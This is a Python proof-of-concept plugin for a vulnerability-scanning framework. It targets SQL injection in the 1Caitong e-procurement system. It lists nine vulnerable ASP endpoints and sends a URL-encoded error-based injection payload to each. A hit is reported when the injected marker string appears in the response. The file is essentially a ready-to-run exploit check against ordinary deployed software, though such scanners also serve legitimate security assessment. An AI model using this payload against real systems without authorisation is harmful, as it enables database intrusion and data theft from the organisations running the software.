# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = '1Caitong_0007'  # 平台漏洞编号，留空
    name = '北京网达信联通用型电子采购系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-24'  # 漏洞公布时间
    desc = '''
        北京网达信联通用型电子采购系统多处SQL注入漏洞：
        /Rat/ebid/viewInvite3.asp?InviteId=0000002852
        /Rat/ebid/viewInvite4.asp?InviteId=0000002852
        /Rat/ebid/viewInvite5.asp?InviteId=0000002852
        /Rat/ebid/viewInvite6.asp?InviteId=0000002852
        /Rat/ebid/viewInvite2.asp?InviteId=0000002852
        /Rat/ebid/viewInvite1.asp?InviteId=0000002852
        /Rat/EBid/ViewClarify1.asp?InviteId=11
        /Rat/EBid/ViewClarify.asp?InviteId=11
        /Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0122276'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '1Caitong(一采通)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '23c2b8b1-68ee-43fd-b226-3990796ffa70'
    author = '国光'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                "/Rat/ebid/viewInvite3.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite4.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite5.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite6.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite2.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite1.asp?InviteId=0000002852",
                "/Rat/EBid/ViewClarify1.asp?InviteId=11",
                "/Rat/EBid/ViewClarify.asp?InviteId=11",
                "/Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11",
            ]
            data = "%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"

            for url in urls:
                vul = arg + url + data
                code, head, res, errcode, _ = hh.http(vul)
                if code != 0 and 'testXQ17' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
